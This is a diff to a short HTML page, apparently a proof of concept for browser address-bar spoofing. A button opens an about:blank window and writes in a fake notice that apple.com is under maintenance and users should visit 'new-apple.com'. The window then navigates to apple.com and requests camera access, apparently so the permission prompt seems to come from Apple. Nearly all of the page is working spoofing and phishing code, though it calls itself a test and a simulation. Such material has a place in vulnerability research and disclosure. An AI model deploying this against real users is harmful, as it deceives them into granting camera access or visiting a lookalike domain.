@@ -1,26 +1,39 @@
-<h1>test purpose</h1>
+<h1 style="font-size: 50px;">Test Purpose</h1>
 <br>
-
 <button style="font-size: 50px;" onclick="spoof()">Click</button>
+
+<div id="instruction" style="display:none;">
+    <img
+        src="https://heloworld285.github.io/experimental/tips.png"
+        style="max-width: 100%;"
+    >
+</div>
 
 <script>
 function spoof() {
-    const w = window.open("about:blank");
 
-    w.document.write(`
-        <h1>address spoofed</h1>
+    //ImgSrc
+    document.getElementById("instruction").style.display = "block"
 
-        <script>
-            setTimeout(() => {
-                location.href = "http://apple.com/";
-            }, 1);
+    //about:blank
+    setTimeout(() => {
+        const w = window.open("about:blank");
 
-            setTimeout(() => {
-                navigator.mediaDevices.getUserMedia({video:true})    
-            }, 2000);
-        <\/script>
-    `);
+            w.document.write(`
+                <h1>www.apple.com currently maintenance Pls visit new-apple.com (Simulation)</h1>
 
-    w.document.close();
+                <script>
+                    setTimeout(() => {
+                        location.href = "http://apple.com/";
+                    }, 1);
+
+                    setTimeout(() => {
+                        navigator.mediaDevices.getUserMedia({video:true})    
+                    }, 2000);
+                <\/script>
+            `);
+
+            w.document.close();
+    }, 5000);
 }
 </script>
